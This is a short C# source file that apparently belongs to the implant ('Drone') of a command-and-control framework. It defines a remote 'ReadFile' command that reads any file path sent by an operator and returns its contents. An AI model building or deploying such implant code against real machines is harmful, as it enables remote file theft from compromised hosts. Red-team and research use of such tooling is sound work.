using System.IO;
using System.Threading;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Commands;

public sealed class ReadFile : DroneCommand
{
    public override byte Command => 0x08;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var text = File.ReadAllText(task.Arguments[0]);
        await Drone.SendOutput(task, text);
    }
}